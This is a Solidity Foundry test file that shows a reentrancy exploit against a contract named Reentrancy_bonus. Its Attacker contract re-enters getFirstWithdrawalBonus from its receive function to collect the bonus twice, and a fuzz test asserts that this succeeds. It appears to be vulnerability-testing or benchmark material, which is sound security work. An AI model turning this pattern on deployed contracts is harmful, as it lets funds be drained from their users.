
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    
    Reentrancy_bonus reentrancyBonus;
    Attacker public _attacker;

    function setUp() public {
        reentrancyBonus = new Reentrancy_bonus();
        _attacker = new Attacker(address(reentrancyBonus));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 200 && attackVal < type(uint128).max);

        vm.deal(address(reentrancyBonus), attackVal); 
        
        vm.deal(address(this), attackVal);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    
    Reentrancy_bonus victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        victim = Reentrancy_bonus(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.getFirstWithdrawalBonus(address(this));

        if (address(this).balance > initialSnapshot + 100) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
